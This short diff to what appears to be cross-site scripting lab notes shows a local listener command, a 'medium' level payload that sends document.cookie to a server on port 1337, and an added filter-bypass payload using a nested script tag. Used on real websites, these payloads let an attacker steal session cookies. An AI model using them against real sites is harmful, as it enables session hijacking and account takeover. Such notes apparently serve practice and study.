@@ -12,4 +12,5 @@ python3 -m http.server 1337
 ### medium 
 ```
 <SCRIPT>window.location='http://127.0.0.1:1337?cookie='+document.cookie</script>
+<scr<script>ipt>alert('hacked')</script>
 ```
